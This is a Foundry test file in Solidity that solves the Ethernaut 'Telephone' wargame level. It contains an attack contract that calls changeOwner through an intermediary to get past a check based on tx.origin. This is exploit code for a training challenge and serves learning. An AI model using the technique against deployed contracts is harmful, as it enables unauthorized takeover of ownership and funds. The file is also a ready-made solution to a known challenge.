// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/04-Telephone/TelephoneFactory.sol";
import "../src/Ethernaut.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function notTxOrigin() external {
        telephone.changeOwner(tx.origin);
    }
}

contract TelephoneTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testTelephone() public {
        // Level Setup
        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone ethernautTelephone = Telephone(payable(levelAddress));

        // Level Attack
        TelephoneAttack attack = new TelephoneAttack(levelAddress);
        attack.notTxOrigin();

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}